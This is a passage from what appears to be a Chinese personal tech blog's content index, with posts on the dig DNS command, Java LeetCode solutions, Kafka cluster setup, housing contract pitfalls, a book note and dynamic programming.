f.root-servers.net.. 5747 IN NS l.root-servers.net.. 5747 IN NS j.root-servers.net.. 5747 IN NS g.root-servers.net.. 5747 IN NS i.root-servers.net.. 5747 IN NS e.root-servers.net.. 5747 IN NS h.root-servers.net.;; Query time: 40 msec;; SERVER: 8.8.8.8#53(8.8.8.8);; WHEN: 一 5月 27 22:37:23 CST 2019;; MSG SIZE rcvd: 239 dig 命令默认的输出信息比较丰富,大概可以分为 5 个部分。 第一部分显示 dig 命令的版本和输入的参数。 第二部分显示服务返回的一些技术详情，比较重要的是 status。如果 status 的值为 NOERROR 则说明本次查询成功结束。 第三部分中的 “QUESTION SECTION” 显示我们要查询的域名。 第四部分的 “ANSWER SECTION” 是查询到的结果。 第五部分则是本次查询的一些统计信息，比如用了多长时间，查询了哪个 DNS 服务器，在什么时间进行的查询等等。 dig -h 帮助命令 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071[root@docker ~]# dig -hUsage: dig [@global-server] [domain] [q-type] [q-class] &#123;q-opt&#125; &#123;global-d-opt&#125; host [@local-server] &#123;local-d-opt&#125; [ host [@local-server] &#123;local-d-opt&#125; [...]]Where: domain is in the Domain Name System q-class is one of (in,hs,ch,...) [default: in] q-type is one of (a,any,mx,ns,soa,hinfo,axfr,txt,...) [default:a] (Use ixfr=version for type ixfr) q-opt is one of: -x dot-notation (shortcut for reverse lookups) -i (use IP6.INT for IPv6 reverse lookups) -f filename (batch mode) -b address[#port] (bind to source address/port) -p port (specify port number) -q name (specify query name) -t type (specify query type) -c class (specify query class) -k keyfile (specify tsig key file) -y [hmac:]name:key (specify named base64 tsig key) -4 (use IPv4 query transport only) -6 (use IPv6 query transport only) -m (enable memory usage debugging) d-opt is of the form +keyword[=value], where keyword is: +[no]vc (TCP mode) +[no]tcp (TCP mode, alternate syntax) +time=### (Set query timeout) [5] +tries=### (Set number of UDP attempts) [3] +retry=### (Set number of UDP retries) [2] +domain=### (Set default domainname) +bufsize=### (Set EDNS0 Max UDP packet size) +ndots=### (Set NDOTS value) +[no]edns[=###] (Set EDNS version) [0] +[no]search (Set whether to use searchlist) +[no]showsearch (Search with intermediate results) +[no]defname (Ditto) +[no]recurse (Recursive mode) +[no]ignore (Don't revert to TCP for TC responses.) +[no]fail (Don't try next server on SERVFAIL) +[no]besteffort (Try to parse even illegal messages) +[no]aaonly (Set AA flag in query (+[no]aaflag)) +[no]adflag (Set AD flag in query) +[no]cdflag (Set CD flag in query) +[no]cl (Control display of class in records) +[no]cmd (Control display of command line) +[no]comments (Control display of comment lines) +[no]rrcomments (Control display of per-record comments) +[no]question (Control display of question) +[no]answer (Control display of answer) +[no]authority (Control display of authority) +[no]additional (Control display of additional) +[no]stats (Control display of statistics) +[no]short (Disable everything except short form of answer) +[no]ttlid (Control display of ttls in records) +[no]all (Set or clear all display flags) +[no]qr (Print question before sending) +[no]nssearch (Search all authoritative nameservers) +[no]identify (ID responders in short answers) +[no]trace (Trace delegation down from root [+dnssec]) +[no]dnssec (Request DNSSEC records) +[no]nsid (Request Name Server ID) +[no]sigchase (Chase DNSSEC signatures) +trusted-key=#### (Trusted Key when chasing DNSSEC sigs) +[no]topdown (Do DNSSEC validation top down mode) +[no]split=## (Split hex/base64 fields into chunks) +[no]multiline (Print records in an expanded format) +[no]onesoa (AXFR prints only one soa record) global d-opts and servers (before host name) affect all queries. local d-opts and servers (after host name) affect only that lookup. -h (print help and exit) -v (print version and exit) dig 跟踪解析信息12345678910111213141516171819202122[root@docker ~]# dig www.baidu.com; &lt;&lt;&gt;&gt; DiG 9.9.4-RedHat-9.9.4-73.el7_6 &lt;&lt;&gt;&gt; www.baidu.com;; global options: +cmd;; Got answer:;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 49066;; flags: qr rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 1;; OPT PSEUDOSECTION:; EDNS: version: 0, flags:; udp: 4096;; QUESTION SECTION:;www.baidu.com. IN A;; ANSWER SECTION:www.baidu.com. 559 IN CNAME www.a.shifen.com.www.a.shifen.com. 265 IN A 220.181.38.150www.a.shifen.com. 265 IN A 220.181.38.149;; Query time: 12 msec;; SERVER: 8.8.8.8#53(8.8.8.8);; WHEN: ? 5? 27 19:06:53 CST 2019;; MSG SIZE rcvd: 101 -4 查看域名对应的 IP 信息123456789101112131415161718192021[root@docker ~]# dig -4 baidu.com; &lt;&lt;&gt;&gt; DiG 9.9.4-RedHat-9.9.4-73.el7_6 &lt;&lt;&gt;&gt; -4 baidu.com;; global options: +cmd;; Got answer:;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 63475;; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 1;; OPT PSEUDOSECTION:; EDNS: version: 0, flags:; udp: 4096;; QUESTION SECTION:;baidu.com. IN A;; ANSWER SECTION:baidu.com. 69 IN A 123.125.114.144baidu.com. 69 IN A 220.181.57.216;; Query time: 17 msec;; SERVER: 8.8.8.8#53(8.8.8.8);; WHEN: 一 5月 27 23:13:13 CST 2019;; MSG SIZE rcvd: 70 +trace 跟踪整个解析过程dig 非常著名的一个查询选项就是+trace，当使用这个查询选项后，dig 会从根域查询一直跟踪直到查询到最终结果，并将整个过程信息输出出来。 123456789101112131415161718192021222324[root@docker ~]# dig +trace www.baidu.com; &lt;&lt;&gt;&gt; DiG 9.9.4-RedHat-9.9.4-73.el7_6 &lt;&lt;&gt;&gt; +trace www.baidu.com;; global options: +cmd. 17828 IN NS m.root-servers.net.. 17828 IN NS i.root-servers.net.. 17828 IN NS k.root-servers.net.. 17828 IN NS g.root-servers.net.. 17828 IN NS l.root-servers.net.. 17828 IN NS j.root-servers.net.. 17828 IN NS a.root-servers.net.. 17828 IN NS c.root-servers.net.. 17828 IN NS b.root-servers.net.. 17828 IN NS h.root-servers.net.. 17828 IN NS d.root-servers.net.. 17828 IN NS f.root-servers.net.. 17828 IN NS e.root-servers.net.. 84718 IN RRSIG NS 8 0 518400 20190608170000 20190526160000 25266 . puMtHfihNwO4XbPLjH4y0H1pRc7OTrzIYcXQksxj4n6XIotEV/nwmVoi K/8fuqubwtjF2lNLh/ppB/cZNFT7GWA3sZuAF4l1Gfpy5iI5+sxEE2O8 NdTCnj4GRW6/sOF/j3rWb6UmaoqHlqRTTGDyH+NAayUHc3DuOIp9tWzZ x2DVnZrSnioDFr4ypvuMC9knXosE5+FMuQKJBx53i+UB510x0B3iGOs7 h/hTnjgW4eKCvvPq657coHZo5ak9KO0fjOFZ+6qw+uNx2NfqvybnUm/7 bs1AiF0yOxUPYwolQSWEsr2xaGQTHqf4Hk8etO7BJoFnlw92CTOeZj0m HI8Jig==;; Received 525 bytes from 8.8.8.8#53(8.8.8.8) in 6469 mswww.baidu.com. 3 IN CNAME www.a.shifen.com.www.a.shifen.com. 8 IN A 220.181.38.150www.a.shifen.com. 8 IN A 220.181.38.149;; Received 101 bytes from 192.33.4.12#53(c.root-servers.net) in 7 ms -x 根据 IP 反查域名1234567891011121314151617181920[root@docker ~]# dig -x 8.8.8.8; &lt;&lt;&gt;&gt; DiG 9.9.4-RedHat-9.9.4-73.el7_6 &lt;&lt;&gt;&gt; -x 8.8.8.8;; global options: +cmd;; Got answer:;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 37738;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1;; OPT PSEUDOSECTION:; EDNS: version: 0, flags:; udp: 4096;; QUESTION SECTION:;8.8.8.8.in-addr.arpa. IN PTR;; ANSWER SECTION:8.8.8.8.in-addr.arpa. 8107 IN PTR google-public-dns-a.google.com.;; Query time: 32 msec;; SERVER: 8.8.8.8#53(8.8.8.8);; WHEN: 一 5月 27 23:08:36 CST 2019;; MSG SIZE rcvd: 93 参考资料 《dig 挖出 DNS 的秘密》-linux 命令五分钟系列之三十四","updated":"2020-07-19T00:23:27.879Z","tags":[{"name":"linux","slug":"linux","permalink":"http://xwolf191.github.io/tags/linux/"}]},{"title":"703. Kth Largest Element in a Stream","date":"2019-05-25T08:15:00.000Z","path":"2019/05/25/数据结构和算法/leetcode/Kth Largest Element in a Stream/","text":"Design a class to find the kth largest element in a stream. Note that it is the kth largest element in the sorted order, not the kth distinct element. Your KthLargest class will have a constructor which accepts an integer k and an integer array nums, which contains initial elements from the stream. For each call to the method KthLargest.add, return the element representing the kth largest element in the stream. Example: 12345678int k = 3;int[] arr = [4,5,8,2];KthLargest kthLargest = new KthLargest(3, arr);kthLargest.add(3); // returns 4kthLargest.add(5); // returns 5kthLargest.add(10); // returns 5kthLargest.add(9); // returns 8kthLargest.add(4); // returns 8 Note: 1You may assume that nums&apos; length ≥ k-1 and k ≥ 1. 题意求数组中的第K个最大值 实现 java 优先级队列 123456789101112131415161718192021static class KthLargest &#123; final PriorityQueue&lt;Integer&gt; q; final int k; public KthLargest(int k, int[] a) &#123; this.k = k; q = new PriorityQueue&lt;&gt;(k); for (int n : a) add(n); &#125; public int add(int n) &#123; if (q.size() &lt; k) q.offer(n); else if (q.peek() &lt; n) &#123; q.poll(); q.offer(n); &#125; return q.peek(); &#125; &#125; 参考资料 kth-largest-element-in-a-stream","updated":"2020-07-19T00:23:28.028Z","tags":[{"name":"heapsort","slug":"heapsort","permalink":"http://xwolf191.github.io/tags/heapsort/"},{"name":"leetcode","slug":"leetcode","permalink":"http://xwolf191.github.io/tags/leetcode/"}]},{"title":"Kafka集群搭建","date":"2019-05-23T08:30:00.000Z","path":"2019/05/23/distributed/Kafka集群搭建/","text":"准备 zookeeper 集群搭建 kafka 安装包下载 java 安装配置 配置本文以 kafka2.12 版本为例来配置,两个 broker 来搭建集群. 基础配置主要配置 server.properties,先配置一下两个参数,其他的日志、线程、缓冲区、压缩等先不做配置。 12345678#保证集群中ID的唯一性，默认为0.broker.id = 1# 指定监听端口,默认9092. listeners = PLAINTEXT://your.host.name:9092listeners=PLAINTEXT://:9093#指定ZK集群zookeeper.connect=hadoop01:2181,hadoop02:2181,hadoop03:2181 注意同一主机区分端口和日志目录,否则集群启动失败. 使用简单的生产者消费者1234567891011121314#启动kafka./kafka-server-start.sh -daemon ../config/server.properties#创建topic./kafka-topics.sh --create --zookeeper localhost:2181 --replication-factor 1 --partitions 1 --topic test#获取topic 列表./kafka-topics.sh --list --zookeeper localhost:2181#生产者发送消息./kafka-console-producer.sh --broker-list localhost:9092,localhost:9093 --topic test#消费者接收消息./kafka-console-consumer.sh --bootstrap-server localhost:9092,localahost:9093 --from-beginning --topic test kafka 启动成功后，执行 jps,可以看到 kafka 进程信息。 生产者发送消息,消费者都可以正常收到消息。 多分区复制上边简单的例子只有一个分区,且每份数据保存一份。在分布式系统中如果该分区故障则数据会不可用,这是不能容忍的。需要保留多个分区提供负载均衡且有多份数据. 创建 topic,发送消息1./kafka-topics.sh --create --zookeeper localhost:2181 --replication-factor 2 --partitions 3 --topic test2 发送消息也和单分区没有任何区别. 监控利用 Kafka Tools 监控 kafka 集群. 安装 Kafka Tools选择合适的版本,下载Kafka Tools. 连接 kafka 集群指定集群名称,zk 地址,broker 地址 查看分区中所有数据 查看对应分区中的属性信息 查看对应分区中的数据 查看当前分区的复制情况 参考资料 Kafka 官网","updated":"2020-07-19T00:23:27.804Z","tags":[{"name":"kafka","slug":"kafka","permalink":"http://xwolf191.github.io/tags/kafka/"}]},{"title":"2. Add Two Numbers","date":"2019-05-21T07:15:00.000Z","path":"2019/05/21/数据结构和算法/leetcode/Add Two Numbers/","text":"You are given two non-empty linked lists representing two non-negative integers. The digits are stored in reverse order and each of their nodes contain a single digit. Add the two numbers and return it as a linked list. You may assume the two numbers do not contain any leading zero, except the number 0 itself.Example: 123Input: (2 -&gt; 4 -&gt; 3) + (5 -&gt; 6 -&gt; 4)Output: 7 -&gt; 0 -&gt; 8Explanation: 342 + 465 = 807. 题意两个链表求和结果保存到一个翻转的链表中. 实现 java 定义结果链表和一个指向该链表的引用 cur,cur 表示当前正在处理的结点. 1234567891011121314151617181920212223242526272829public ListNode addTwoNumbers(ListNode p, ListNode q)&#123; ListNode result = new ListNode(0); int big = 0 ; ListNode cur = result; while(p != null || q != null)&#123; int a = p == null ? 0 : p.val; int b = q == null ? 0 : q.val; int val = a + b + big; if (val &gt;= 10)&#123; val -= 10; big = 1; &#125; else &#123; big = 0; &#125; ListNode cld = new ListNode(val); cur.next = cld; cur = cur.next; if (p != null)&#123; p = p.next; &#125; if (q != null)&#123; q = q.next; &#125; &#125; if (big &gt; 0) &#123; cur.next = new ListNode(big); &#125; return result.next; &#125; 参考资料 add-two-numbers","updated":"2020-07-19T00:23:28.021Z","tags":[{"name":"leetcode","slug":"leetcode","permalink":"http://xwolf191.github.io/tags/leetcode/"}]},{"title":"别草率签名！教你如何避开二手房合同陷阱！","date":"2019-05-21T03:10:00.000Z","path":"2019/05/21/杂侃/教你如何避开二手房合同陷阱/","text":"由于二手房的交易纷繁复杂，因此买卖双方最终的实际情况也会千差万别。故而小编建议各位购房者在签订二手房买卖合同时更要多加注意，当心遇到陷阱。 一、如何确定交房时间？各位购房者需要特别注意＂不可抗力＂在合同中是如何界定的。房产销售合同一般都有＂销售方遇不可抗力导致逾期交房，不承担责任＂这样的表述。这项约定条款是否合理？其附带注解是否明确？这一点是购房者一般很容易忽略或者是不知其到底是哪种含义的。 二、如何确定房屋面积？对于商品房这种特殊的商品，一般是允许合同约定的面积存有误差的，但是误差不应超过合理的范围，这个范围应该在合同中有明确规定。双方一旦约定了房屋面积的误差范围，卖方就应严格遵守。 如果误差超出约定的范围，实际上就是卖方违约，没有履行合同。但如果合同中没有约定明确的允许误差范围，一旦发生问题，无论误差超过或减少多少，法院可能判决购房者败诉，采取多退少补的方法进行结算。 比如：最后的实测面积比原来的初步测量面积一下子多出了 20 平米，如果当时合同里没有约定只能误差小于 10 平米。那么算下来，对购房者来说这笔支出可不是个小数目。 三、如何查看物业？在签定物业合同之前，应仔细阅读合同条款，看其中是否有不符合规定或对购房者有欺骗行为的条款。同时应对照物业收费标准仔细核对。标准中没有的收费项目，可要求对方出示有关部门的文件，否则有权拒交。 四、“阴阳合同”有何风险？“阴阳合同”是指除了签署一份实际成交价的合同之外，再签一个低于实际交易价的假合同。将假合同作为申报纳税的依据，以达到减少交税的目的。签订房屋买卖合同应当遵守国家政策法规有关规定，按照市场交易规则进行。 因为买卖双方签订阴阳合同的行为严重违反了我国税收管理的规定。如果属于一般偷税行为，行政机关有权给予罚款、拘留等行政处罚；如果偷税数额较大、次数较多，则可能构成犯罪。 五、如何确认真实卖房者？二手房交易中，不仅有“假房主”，还有假不动产权证、假信息等。二手房交易中，经常出现不动产权证上的名字与卖房人不是同一个人的情况，因此购房者如果交了定金并与卖房人签了合同，如果买卖生变，追讨定金也是费时费力的事。 另外，也有骗子伪造户主身份，然后以各种理由骗取购房者信任，将本不属于自己的房子卖掉，拿到购房款后跑掉。购房者要认真审查二手房转让人的主体资格，确定房屋转让人是否是该房屋的产权人。 六、如何避开中介陷阱？大部分二手房都是通过中介来成交的，为了快速达成买卖协议来提取中介费，部分不法中介经常在合同上耍小聪明，蒙蔽买卖双方。买卖双方在签订合同时，最好把和中介有关的条款写入合同中，同时还要注意合同中隐藏的陷阱。 二手房交易时买方不应只注重房屋本身的价格，还要设定条款就中介的责任和义务约定违约责任。一旦中介、出卖人违约，买方可据此来维护权益，要求赔偿。此外，买卖双方还要注意查看交易当中涉及到中介公司的佣金和手续费等费用清单，避免引发纠纷。 七、违约金的支付需要明确通常在拟定二手房交易合同时，为了避免二手房交易出现违约的情况，可以适当的规定违约金的赔付，而绝大多数的二手房买卖合同中违约金的比例都会有明确的条款注明，但对于赔付的时间没有明确的具体款项来规定，这会导致违约方能够依据这些来拖延支付的时间，这会使得条款包括了执行和约束力都会形同虚设，所以小粥给大家表明了，在签订合同中，一定要在合同里加入“买房在实际支付应付款之日起规定期限内向卖方（买方）支付违约金”这条款项，这一条能够确保合同条款的最终落实性。 八、所有费用（除房款外）的交接时间要明确出来房款的支付时间之外，由于二手房的所有水电气这些都是使用过的，一定要标注好水、电、煤气、物业、供暖等各项费用的交接好年月日。如果是公房的交易，对于物业和供暖等等的费用也同时要交纳时间和标准，原房主的单位中是否有一些是要更改或者重新要求的，卖方需要作出的和买方签署协议等等，这些一定要都要在二手房合同里明确写好。 九、学会如何签订补充协议合同通常都是会由这两部分组成的，一部分合同正文，另一部分是补充协议，在买卖双方在签订合同的同时如果遇到合同款中不明确，或者需要进一步约定时，就要在原本合同的相关条款后面的空白行或者在合同后面填写附加条款，将合同中把意思写明白喽，这样就会减少在后续交易的阶段中因为条款的意思含混而造成不便和麻烦。 十、一定要表明好房款交付时间和房子过户时间如果在合同中没有写明这一点，卖方就会就这这一点而延后交房，卖方需要明确买方的付款时间，而同时尾款的支付时间一般是有赖于房产过户的日期，所以，买那个也有权利知道房产的过户时间。在合同中明确好这一条后，如果在执行期间出现逾期现象后，则依照实际情况有违约执行第七点里面的违约责任。","updated":"2020-07-19T00:23:28.426Z","tags":[{"name":"杂侃","slug":"杂侃","permalink":"http://xwolf191.github.io/tags/杂侃/"}]},{"title":"4. Median of Two Sorted Arrays","date":"2019-05-20T11:40:00.000Z","path":"2019/05/20/数据结构和算法/leetcode/Median of Two Sorted Arrays/","text":"There are two sorted arrays nums1 and nums2 of size m and n respectively. Find the median of the two sorted arrays. The overall run time complexity should be O(log (m+n)). You may assume nums1 and nums2 cannot be both empty. Example 1: 1234nums1 = [1, 3]nums2 = [2]The median is 2.0 Example 2: 1234nums1 = [1, 2]nums2 = [3, 4]The median is (2 + 3)/2 = 2.5 题意求出两个给定数组的中位数. 实现 java 合并两个数组,排序求中位数。 123456789101112131415161718public double findMedianSortedArrays(int[] nums1, int[] nums2) &#123; List&lt;Integer&gt; resAry = new ArrayList&lt;&gt;(); if (nums1 != null &amp;&amp; nums1.length &gt; 0)&#123; Arrays.stream(nums1).forEach(resAry::add); &#125; if (nums2 != null &amp;&amp; nums2.length &gt; 0)&#123; Arrays.stream(nums2).forEach(resAry::add); &#125; resAry.sort(Comparator.comparingInt(a -&gt; a)); int len = resAry.size(); int idx = len/2; if ( len % 2 == 0)&#123; int a = resAry.get(idx) + resAry.get(idx -1); return a / 2.0; &#125; else &#123; return resAry.get(idx); &#125; &#125; 但是时间复杂度为 O(m+n),显示和 O(lg(m+n))还是有差距,非最优解. java 二分查找,时间复杂度为 O(lg(m+n)) 123456789101112131415161718192021public double findMedianSortedArrays(int[] A, int[] B) &#123; int m = A.length, n = B.length; int l = (m + n + 1) / 2; int r = (m + n + 2) / 2; return (getkth(A, 0, B, 0, l) + getkth(A, 0, B, 0, r)) / 2.0;&#125;public double getkth(int[] A, int aStart, int[] B, int bStart, int k) &#123; if (aStart &gt; A.length - 1) return B[bStart + k - 1]; if (bStart &gt; B.length - 1) return A[aStart + k - 1]; if (k == 1) return Math.min(A[aStart], B[bStart]); int aMid = Integer.MAX_VALUE, bMid = Integer.MAX_VALUE; if (aStart + k/2 - 1 &lt; A.length) aMid = A[aStart + k/2 - 1]; if (bStart + k/2 - 1 &lt; B.length) bMid = B[bStart + k/2 - 1]; if (aMid &lt; bMid) return getkth(A, aStart + k/2, B, bStart, k - k/2);// Check: aRight + bLeft else return getkth(A, aStart, B, bStart + k/2, k - k/2);// Check: bRight + aLeft&#125; 参考资料 median-of-two-sorted-arrays","updated":"2020-07-19T00:23:28.031Z","tags":[{"name":"leetcode","slug":"leetcode","permalink":"http://xwolf191.github.io/tags/leetcode/"},{"name":"binary search","slug":"binary-search","permalink":"http://xwolf191.github.io/tags/binary-search/"}]},{"title":"被嫌弃的程序员的一生","date":"2019-05-20T11:20:00.000Z","path":"2019/05/20/杂侃/被嫌弃的程序员的一生/","text":"程序员从早前的一种职业发展至今，俨然已经成为大众眼中的「特殊物种」。关于程序员的调侃与段子也盛产于网络，常常引起全网围观。但是程序员说到底并不是「两耳不闻窗外事，一心只用敲代码」，他们也有生活和工作上的烦恼与曲折。他们的人生并不像外人羡慕的那样「精英」，甚至还会有一些「潦倒」。 有一部电影叫做「被嫌弃的松子的一生」，有人评价说：大多数女人不会过成松子，但或多或少有松子的影子。「被嫌弃的程序员的一生」同样如此：不是所有的程序员一生都是如此，但是某个阶段却似曾相似。 不管你处于人生的哪个阶段，也不管你是否后悔成为一名程序员。只愿还是程序员的你，喜乐安好！","updated":"2020-07-19T00:23:28.427Z","tags":[{"name":"杂侃","slug":"杂侃","permalink":"http://xwolf191.github.io/tags/杂侃/"}]},{"title":"嫌疑人X的献身","date":"2019-05-20T03:30:00.000Z","path":"2019/05/20/读书笔记/嫌疑人X的献身/","text":"内容简介百年一遇的数学天才石神，每天唯一的乐趣，便是去固定的便当店买午餐，只为看一眼在便当店做事的邻居靖子。 靖子与女儿相依为命，失手杀了前来纠缠的前夫。石神提出由他料理善后。石神设了一个匪夷所思的局，令警方始终只能在外围敲敲打打，根本无法与案子沾边。石神究竟使用了什么手法？ 作者简介东野圭吾，日本著名作家。1958 年生于大阪。1985 年，以第 31 届江户川乱步奖获奖作品《放学后》出道，开始扬名立万。20 年作品逾 60 部，几乎囊括了日本所有大奖，1998 年，《秘密》获第 52 届日本推理作家协会奖，入围第 120 届直木奖；1999 年，《白夜行》入围第 122 届直木奖；2001 年，《暗恋》入围第 125 届直木奖；2003 年，《信》入围第 129 届直木奖。2006 年，《嫌疑人 X 的献身》终于捧得日本文学最高荣誉直木奖。 前期作品多写得精巧细致，随着写作功底浸润日深，尤其是《白夜行》之后，笔锋日渐老辣：文字鲜加雕琢，叙述简练凶狠，情节跌宕诡异，故事架构几至匪夷所思的地步。至巅峰之作《嫌疑人 X 的献身》，叙事与推理，均已炉火纯青：最好的诡计、无懈可击的推理、恰当的伏笔，以及最普通但最不易猜透的悬念，受到大奖评委的莫大青睐，同时获得直木奖和本格推理小说大奖，更受到评论界、媒体和广大读者的如潮好评，创造了日本推理小说史上绝无仅有的奇迹——同时摘得“这本小说了不起”、“本格推理小说 Top 10”、“周刊文艺推理小说 Top 10”三大推理小说排行榜年度总冠军。 读后感太优秀,各种推理,物理、化学、数学推理层数不穷…","updated":"2020-07-19T00:23:28.443Z","tags":[{"name":"读书笔记","slug":"读书笔记","permalink":"http://xwolf191.github.io/tags/读书笔记/"}]},{"title":"704. Binary Search","date":"2019-05-19T14:30:00.000Z","path":"2019/05/19/数据结构和算法/leetcode/Binary Search/","text":"Given a sorted (in ascending order) integer array nums of n elements and a target value, write a function to search target in nums. If target exists, then return its index, otherwise return -1. Example 1: 123Input: nums = [-1,0,3,5,9,12], target = 9Output: 4Explanation: 9 exists in nums and its index is 4 Example 2: 123Input: nums = [-1,0,3,5,9,12], target = 2Output: -1Explanation: 2 does not exist in nums so return -1 Note: You may assume that all elements in nums are unique. n will be in the range [1, 10000]. The value of each element in nums will be in the range [-9999, 9999]. 题意在一个升序数组中查找是否存在目标元素target,返回其索引。不存在返回-1.实现 java双指针 123456789101112131415161718192021if (nums == null || nums.length == 0)&#123; return -1; &#125; int left = 0,right = nums.length - 1; for ( int i = left; i&lt;= right;i++)&#123; if (nums[i] == target)&#123; return i; &#125; if (nums[right] == target)&#123; return right; &#125; if (left &lt; target)&#123; left ++; continue; &#125; if (right &gt; target)&#123; right --; continue; &#125; &#125; return -1; java 二分查找 123456789101112public int search(int[] nums, int target) &#123; int pivot, left = 0, right = nums.length - 1; while (left &lt;= right) &#123; pivot = (left + right) / 2; if (nums[pivot] == target) return pivot; else &#123; if (target &lt; nums[pivot]) right = pivot - 1; else left = pivot + 1; &#125; &#125; return -1; &#125; 参考资料 Binary Search","updated":"2020-07-19T00:23:28.022Z","tags":[{"name":"leetcode","slug":"leetcode","permalink":"http://xwolf191.github.io/tags/leetcode/"}]},{"title":"633. Sum of Square Numbers","date":"2019-05-19T03:10:00.000Z","path":"2019/05/19/数据结构和算法/leetcode/Sum of Square Numbers/","text":"Given a non-negative integer c, your task is to decide whether there’re two integers a and b such that a^2 + b^2 = c. Example 1: 123Input: 5Output: TrueExplanation: 1 * 1 + 2 * 2 = 5 Example 2: 12Input: 3Output: False 题意给定一个正整数c,判断是否存在两个数使得a^2+b^2=c。 实现 java 使用双指针来判断即可. 1234567891011121314151617public boolean judgeSquareSum(int c) &#123; for (int i = 0 ,j = (int) Math.sqrt(c); i &lt;= j;)&#123; if ( i * i + j * j == c)&#123; return true; &#125; if ( i * i + j * j &gt; c)&#123; j -- ; continue; &#125; if ( i * i + j * j &lt; c)&#123; i ++ ; continue; &#125; &#125; return false; &#125; 参考 sum-of-square-numbers 双指针","updated":"2020-07-19T00:23:28.039Z","tags":[{"name":"leetcode","slug":"leetcode","permalink":"http://xwolf191.github.io/tags/leetcode/"},{"name":"two pointers","slug":"two-pointers","permalink":"http://xwolf191.github.io/tags/two-pointers/"}]},{"title":"3. Longest Substring Without Repeating Characters","date":"2019-05-19T01:10:00.000Z","path":"2019/05/19/数据结构和算法/leetcode/Longest Substring Without Repeating Characters/","text":"Given a string, find the length of the longest substring without repeating characters. Example 1: 123Input: &quot;abcabcbb&quot;Output: 3 Explanation: The answer is &quot;abc&quot;, with the length of 3. Example 2: 123Input: &quot;bbbbb&quot;Output: 1Explanation: The answer is &quot;b&quot;, with the length of 1. Example 3: 1234Input: &quot;pwwkew&quot;Output: 3Explanation: The answer is &quot;wke&quot;, with the length of 3. Note that the answer must be a substring, &quot;pwke&quot; is a subsequence and not a substring. 题意求出字符串中不包含重复字符的最大连续字符串的长度。 实现 java 暴力遍历求解 1234567891011121314151617181920212223242526272829303132if (s == null || s.length() == 0)&#123; return 0; &#125; int max = 0; int temp = 0; int len = s.length(); char[] ary = s.toCharArray(); Set&lt;Character&gt; res = new HashSet&lt;&gt;(); for (int i = 0; i &lt; len; i++)&#123; char out = ary[i]; if (!res.contains(out))&#123; temp++; res.add(out); for (int j = i+1; j &lt; len;j++)&#123; char in = ary[j]; if (!res.contains(in))&#123; temp ++; res.add(in); &#125; else &#123; break; &#125; &#125; if (temp &gt; max)&#123; max = temp; &#125; temp = 0; res.clear(); &#125; else &#123; break; &#125; &#125; return max; 讨论区其他答案 java HashMap求解 12345678910111213public int lengthOfLongestSubstring(String s) &#123; if (s.length()==0) return 0; HashMap&lt;Character, Integer&gt; map = new HashMap&lt;Character, Integer&gt;(); int max=0; for (int i=0, j=0; i&lt;s.length(); ++i)&#123; if (map.containsKey(s.charAt(i)))&#123; j = Math.max(j,map.get(s.charAt(i))+1); &#125; map.put(s.charAt(i),i); max = Math.max(max,i-j+1); &#125; return max; &#125; java 双指针 1234567891011121314151617181920212223242526public int lengthOfLongestSubstring(String s) &#123; char[] v=s.toCharArray(); int length=-1; int max=0; for(int i=0;i&lt;v.length;i++)&#123; if(i==0)&#123; length=1; max=1; &#125;else&#123; int ind=-1; for(int j=i-1;j&gt;=i-length;j--)&#123; if(v[i]==v[j])&#123; ind=j-(i-length); break; &#125; &#125; if(ind==-1)&#123; length=length+1; &#125;else&#123; length=length-ind; &#125; max=max&gt;length?max:length; &#125; &#125; return max;&#125; 参考资料 longest-substring-without-repeating-characters","updated":"2020-07-19T00:23:28.030Z","tags":[{"name":"leetcode","slug":"leetcode","permalink":"http://xwolf191.github.io/tags/leetcode/"},{"name":"two pointers","slug":"two-pointers","permalink":"http://xwolf191.github.io/tags/two-pointers/"}]},{"title":"java序列化协议详解","date":"2019-05-17T09:50:00.000Z","path":"2019/05/17/java/java序列化协议详解/","text":"参考资料 Object Serialization Stream Protocol","updated":"2020-07-19T00:23:27.860Z","tags":[{"name":"java","slug":"java","permalink":"http://xwolf191.github.io/tags/java/"}]},{"title":"动态规划(DP)","date":"2019-05-17T05:50:00.000Z","path":"2019/05/17/数据结构和算法/动态规划/","text":"动态编程既是数学优化方法,也是计算机编程方法。该方法由 Richard Bellman 在 20 世纪 50 年代开发,并已在航空航天工程和经济学等众多领域得到应用。在这两种情况下,它指的是通过以递归方式将其分解为更简单的子问题来简化复杂问题。虽然某些决策问题不能以这种方式分开,但是跨越几个时间点的决策通常会递归地分解。同样,在计算机科学中,如果通过将问题分解为子问题然后递归地找到子问题的最优解来最佳地解决问题,那么据说它具有最优子结构。 如果子问题可以在较大的问题中递归嵌套,那么动态编程方法是适用的,则较大问题的值与子问题的值之间存在关联。在优化文献中,这种关系称为 Bellman 方程。 什么是 DP以斐波那契数列为例,给出两种方法来解决该问题.斐波那契数列指的是这样一个数列 1, 1, 2, 3, 5, 8, 13, 21, 34, 55, 89, 144, 233,377,610,987,1597,2584,4181,6765,10946,17711,28657,46368……..求第 n 个数是多少? 递归解决 123456789public static long f(int n) &#123; if ( n == 0)&#123; return 0; &#125; if ( n == 1)&#123; return 1; &#125; return f(n-1) + f(n-2); &#125; DP 动态规划分解子问题,循环求解. 1234567891011121314/** * 动态规划优化子问题 * @param n * @return */ public static long f(int n)&#123; long[] f = new long[n+1]; f[0] = 0; f[1] = 1; for (int i = 2 ; i &lt;= n;i++)&#123; f[i] = f[i-1] + f[i-2]; &#125; return f[n]; &#125; 给出这两种方法都可以解决问题,但是递归受限于递归深度,如果 n 过大,则会抛出 StackOverflowException 或超出最大递归深度。递归方法虽然可以解决此问题但是会有性能问题。动态规划就是将递归方法分解成一个个小问题,f[n] = f[n-1] + f[n-2]只需要求解此问题并保存结果即可。 公共子问题与分治法一样,DP 将解决方案与子问题结合起来。DP 主要用于一次又一次需要相同子问题的解决方案时。在 DP 中,子问题的计算解决方案存储在表中,因此不必重新计算这些解决方案。因此,当没有共同(重叠)子问题时,DP 